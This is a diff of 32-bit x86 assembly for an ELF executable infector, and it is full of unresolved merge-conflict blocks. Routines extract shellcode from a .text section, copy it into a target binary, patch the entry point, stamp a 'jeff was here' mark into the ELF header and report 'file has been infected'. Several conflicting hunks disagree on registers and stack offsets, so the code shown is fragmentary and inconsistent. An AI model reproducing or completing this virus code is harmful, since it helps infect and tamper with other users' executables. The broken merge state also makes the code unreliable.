@@ -1,5 +1,9 @@
 %include "include/shared.s"
+<<<<<<< HEAD
 			;optional TODO's lines: 106, 136, 258, 326
+=======
+			; optional TODO's lines: 106, 136, 258, 326
+>>>>>>> 117534f357a46a0350fbf7de032d4389c76d6453
 			; todo's lines : 433
 STRUC	stat
 	before_size:	resb	20 	; the other elements don't really matter in this context, we just need
@@ -234,10 +238,15 @@ extract_shellcode:
 	mov eax, [elf_data]
 	push eax
 	push shellcode_size
+<<<<<<< HEAD
 	call find_shell 	; returns a pointer to the .text sections, and initializes
 				; the shellcode_size variable
 
 	test eax, eax		; shellcode == NULL ?
+=======
+	call find_shell ; returns a pointer to the .text sections, and initializes the shellcode_size variable
+	test eax, eax	; shellcode == NULL ?
+>>>>>>> 117534f357a46a0350fbf7de032d4389c76d6453
 	jne next
 	push ERR_NO_SHELL
 	jmp clean
@@ -270,7 +279,11 @@ segments:
 
 	; getting p_phunm
 	mov cx, word[eax + e_phnum]
+<<<<<<< HEAD
 	movzx ecx, cx			; e_phnum is a word value
+=======
+	movzx ecx, cx		; e_phnum is a word value
+>>>>>>> 117534f357a46a0350fbf7de032d4389c76d6453
 
 next_segment:
 
@@ -316,8 +329,13 @@ next2:
 	push shell_copied
 	push shell_copied_len
 	call print			; "copying shell .."
+<<<<<<< HEAD
 
 
+=======
+
+
+>>>>>>> 117534f357a46a0350fbf7de032d4389c76d6453
 	; now that everything is validated all we have to do is :
 	;	1 - patch the entry point
 	; 	2 - leave mark
@@ -341,12 +359,21 @@ next2:
 leaving_mark:
 	push marking
 	push marking_len
+<<<<<<< HEAD
 	call print		;"leaving a mark ..."
 
 	mov eax, [pivot_data]
 	add eax, EI_PAD		; pointing at EI_PAD
 	push eax
 	push mark		; the "jeff was here" thingy
+=======
+	call print	;"leaving a mark ..."
+
+	mov eax, [pivot_data]
+	add eax, EI_PAD	; pointing at EI_PAD
+	push eax
+	push mark	; the "jeff was here" thingy
+>>>>>>> 117534f357a46a0350fbf7de032d4389c76d6453
 	call strlen
 	push eax
 	call copy_data
@@ -359,9 +386,15 @@ leaving_mark:
 
 	push enjoy
 	push enjoy_len
+<<<<<<< HEAD
 	call print		; "file has been infected"
 
 	push SUCCESS		; the return value
+=======
+	call print	; "file has been infected"
+
+	push SUCCESS	; the return value
+>>>>>>> 117534f357a46a0350fbf7de032d4389c76d6453
 
 clean: 	; we have to preserve the state of the stack after each call since the return value was the last thing
 	; pushed on the stack
@@ -493,6 +526,15 @@ slow_copy:
 	jns slow_copy
 
 copied:
+<<<<<<< HEAD
+=======
+	;push shell_copied
+	;push shell_copied_len
+	;call print ; "shell copied!"
+	;restoring registers
+	;add esp, 8
+	pop edx
+>>>>>>> 117534f357a46a0350fbf7de032d4389c76d6453
 	pop ecx
 	pop edi
 	pop esi
@@ -658,8 +700,15 @@ find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a poi
 	mov ebx, [ebp + 0xc] ; this will stay in ebx for the rest of the function so we don't keep accessing memorry
 
 	;;taking care of the generic section pointer (@ ebp - 4)
+<<<<<<< HEAD
 	mov edi, [ebx + e_shoff]
 	add edi, ebx	; for later
+=======
+	mov edx, [ebx + e_shoff]
+	add edx, ebx	; for later
+	; edx has the generic section pointer
+	mov [ebp - 4], edx
+>>>>>>> 117534f357a46a0350fbf7de032d4389c76d6453
 	;;
 
 
@@ -669,7 +718,11 @@ find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a poi
 	mov ecx, Elf32_Shdr_size
 	mul cl			; eax now has the string table file offset in file, and edx has the sections 
 				; base in memorry
+<<<<<<< HEAD
 	add eax, edi
+=======
+	add eax, edx
+>>>>>>> 117534f357a46a0350fbf7de032d4389c76d6453
 	; now we have a pointer to the string table section, but we want the actuall offset of the section
 	; in memorry
 	mov edx, [eax + sh_offset]
@@ -678,13 +731,21 @@ find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a poi
 
 	;;taking care of the section_count variable (@ ebp - 0xc)
 	mov ax, [ebx + e_shnum]
+<<<<<<< HEAD
 	mov word[ebp - 2], ax
+=======
+	mov word[ebp - 0xc], ax
+>>>>>>> 117534f357a46a0350fbf7de032d4389c76d6453
 
 	; parsing the sections and returning the address of .text
 	xor ecx, ecx
 	push target_section	; argument to strcmp
 
 parsing_loop:
+<<<<<<< HEAD
+=======
+	mov eax, [ebp - 0x4]	; generic section pointer, by default it points to the first section
+>>>>>>> 117534f357a46a0350fbf7de032d4389c76d6453
 	;get the sh_name and add it to edx (the string table section)
 	mov esi, [edi + sh_name]
 	add esi, edx
@@ -703,7 +764,11 @@ parsing_loop:
 	jne parsing_loop
 
 no_text_section:
+<<<<<<< HEAD
 	xor eax, eax 		; text = NULL
+=======
+	xor eax, eax 	; text = NULL
+>>>>>>> 117534f357a46a0350fbf7de032d4389c76d6453
 	push no_text
 	push no_text_len
 	call print
@@ -712,8 +777,14 @@ no_text_section:
 
 found_text_section:;
 	;storing the address of the section header
+<<<<<<< HEAD
 	mov eax, edi			; the section header pointer
 	mov eax, [edi + sh_offset] 	; the actual section offset
+=======
+	mov eax, [ebp - 0x4]		; the section header pointer
+	mov ecx, eax			; for storing the size later
+	mov eax, [eax + sh_offset] 	; the actual section offset
+>>>>>>> 117534f357a46a0350fbf7de032d4389c76d6453
 	add eax, ebx			; ebx still contains the mmap memory base ; this eax will be returned to 
 					; the previous function!
 	;storing the size
